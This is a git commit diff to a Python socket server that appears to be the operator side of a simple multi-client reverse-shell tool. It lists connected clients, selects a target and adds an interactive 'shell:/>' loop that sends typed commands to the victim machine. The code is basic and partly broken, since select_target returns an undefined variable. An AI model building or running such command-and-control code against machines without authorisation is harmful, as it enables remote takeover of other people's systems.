97b307ddc53acca9587af83befb911b0e7055ae4
JoDrack <buingojoseph24@gmail.com>
2021-03-21 05:49:01 -0700

    update of the server side code in procedural paradigm

--- try.py
+++ try.py
@@ -4,20 +4,22 @@ from rich import print
 host = socket.gethostbyname(socket.gethostname())
 port = 1234
 addr = (host, port)
+chunk = 32
 all_connections = []
 all_addresses = []
 
 server = socket.socket()
 server.bind(addr)
 server.listen()
-print('Waiting for a new connection')
+print('[bold yellow][+++]Waiting for a new connection')
 
 def accept_conn():
     try:
         while True:
             try:
                 client,address = server.accept()
-                client_hostname = client.recv(1024).decode()
+                # client_hostname = client.recv(1024).decode()
+                client_hostname = receive_short_data(client)
 
                 # adding the received client_hostname to the address tuple
                 address += (client_hostname,)  
@@ -54,7 +56,7 @@ def select_target(cmd):
         return None, None
 
     print(f'[bold yellow]Now connected to {all_addresses[target][2]}')
-    return target,cmd
+    return target,conn
 
 def shell():
     while True:
@@ -64,9 +66,39 @@ def shell():
             list_all_connections()
         elif 'select' in cmd:
             target,conn = select_target(cmd)
+
+            if conn is not None:
+                send_commands(conn)
         else:
             print('error')
 
+def send_commands(conn):
+    while True:
+        cmd = input(f"[bold blue]shell:/> ")
+        conn.send(cmd.encode("utf-8"))
+        print('Command sent successfully')
+
+def receive_large_data(conn):
+    data = b''
+    while len(data) < chunk:
+        packet = conn.recv(chunk - len(data))
+
+        if not packet:
+            return None
+
+        # getting the entire data
+        data += packet
+        # data = data.decode()
+    # returning the entire data to be used after
+    return data
+
+def receive_short_data(conn):
+    data = conn.recv(1024).decode()
+
+    # returning data received to be used after
+    return data
+    
+   
 accept_conn()
 
 
